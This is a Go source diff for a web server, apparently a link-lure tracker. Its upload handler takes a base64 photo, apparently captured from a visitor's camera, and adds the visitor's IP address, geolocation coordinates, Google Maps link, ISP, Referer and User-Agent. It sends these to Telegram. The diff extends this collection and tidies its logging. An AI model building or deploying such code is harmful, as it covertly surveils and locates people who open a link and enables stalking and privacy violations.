@@ -40,8 +40,6 @@ type LocationData struct {
 	IsProxy     bool    `json:"is_proxy"`
 }
 
-var scheme string
-
 func serveLandingPage(w http.ResponseWriter, r *http.Request) {
 	originalURL := r.URL.Query().Get("url")
 
@@ -212,7 +210,6 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Dapatkan IP dan data lokasi
 	ip, location, err := getIPAndLocation()
 	if err != nil {
 		log.Printf("Gagal mendapatkan IP atau lokasi: %v", err)
@@ -220,16 +217,6 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if r.URL.Scheme == "" {
-		scheme = "http"
-	} else {
-		scheme = "https"
-	}
-
-	hostUrl := fmt.Sprintf("%s://%s/?url=%s", scheme, r.Host, data.URLID)
-	mapsUrl := fmt.Sprintf("https://www.google.co.id/maps/place/%f,%f", location.Latitude, location.Longitude)
-
-	// Dekode string base64 menjadi byte
 	photoBytes, err := base64.StdEncoding.DecodeString(data.Image[len("data:image/jpeg;base64,"):])
 	if err != nil {
 		log.Printf("Gagal mendekode gambar base64: %v", err)
@@ -237,11 +224,16 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	hostUrl := r.Header.Get("Referer")
+	mapsUrl := fmt.Sprintf("https://www.google.co.id/maps/place/%f,%f", location.Latitude, location.Longitude)
+	userAgent := r.Header.Get("User-Agent")
+
 	message := fmt.Sprintf(
-		"IP Address\t: %s\nFrom URL\t: %s\nURL Host\t: %s\n\nLocation\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\nMaps\t: %s\n\nNetwork\nAS/ISP Number\t: %s\nAS/ISP\t: %s\nIs Proxy\t: %t",
+		"IP Address: %s\nFrom URL: %s\nURL Host: %s\nUser Agent: %s\n\nLocation\nCountry Code: %s\nCountry Name: %s\nRegion Name: %s\nCity Name: %s\nLatitude: %f\nLongitude: %f\nMaps: %s\n\nNetwork\nAS/ISP Number: %s\nAS/ISP: %s\nIs Proxy: %t",
 		ip,
 		data.URLID,
 		hostUrl,
+		userAgent,
 		location.CountryCode,
 		location.CountryName,
 		location.RegionName,
@@ -262,22 +254,7 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("Gagal mengirim foto ke Telegram: %v", err)
 	}
 
-	log.Printf(
-		"IP Address\t: %s\nFrom URL\t: %s\nURL Host\t: %s\n\nLocation\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\nMaps\t: %s\n\nNetwork\nAS/ISP Number\t: %s\nAS/ISP\t: %s\nIs Proxy\t: %t",
-		ip,
-		data.URLID,
-		hostUrl,
-		location.CountryCode,
-		location.CountryName,
-		location.RegionName,
-		location.CityName,
-		location.Latitude,
-		location.Longitude,
-		mapsUrl,
-		location.ASN,
-		location.AS,
-		location.IsProxy,
-	)
+	log.Println(message)
 
 	w.WriteHeader(http.StatusOK)
 	fmt.Fprintf(w, "Foto berhasil diterima.")
